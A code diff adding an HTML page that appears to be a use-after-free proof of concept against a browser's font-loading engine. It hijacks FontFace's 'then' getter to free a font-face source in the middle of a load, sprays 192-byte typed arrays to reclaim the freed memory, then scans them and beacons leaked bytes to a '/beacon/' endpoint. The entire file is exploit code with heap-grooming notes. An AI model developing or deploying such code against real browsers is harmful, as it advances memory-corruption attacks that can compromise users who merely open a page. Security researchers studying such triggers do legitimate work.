@@ -1,0 +1,49 @@
+<!doctype html><meta charset="utf-8"><title>uaf24</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var styleEl=null, firedHere=false, BUF=[], reported=false;
+function scan(tag){
+  var found=[];
+  for (var i=0;i<BUF.length;i++){
+    var u=BUF[i];
+    if (u[0]||u[0x58]||u[0x68]) found.push('b'+i+'-0:'+hex8(u,0)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68));
+  }
+  if (found.length){ b('U24-'+tag+'-HIT-'+found.join('|')); return true; }
+  b('U24-'+tag+'-CLEAN-'+BUF.length); return false;
+}
+function setup(){
+  var A=new FontFace('v0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: w0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U24-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      /* 192 class only: never touch the 96 class that holds CSSFontFaceSource */
+      BUF=[];
+      for (var j=0;j<96;j++) BUF.push(new Uint8Array(192));
+      b('U24-SPRAY-192-'+BUF.length);
+      try { document.fonts.check('1em w0'); } catch(e){}
+      b('U24-CHECK-RETURNED');
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U24-LOAD-CALLED');
+  document.fonts.load('1em v0, w0','AB').then(function(){ b('U24-RESOLVED'); if(!reported){reported=true;scan('R');} },
+                                            function(){ b('U24-REJECTED'); if(!reported){reported=true;scan('R');} });
+  setTimeout(function(){ if(!reported){reported=true;scan('T80');} },80);
+  setTimeout(function(){ scan('T500'); },500);
+}
+function run(){ b('U24-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
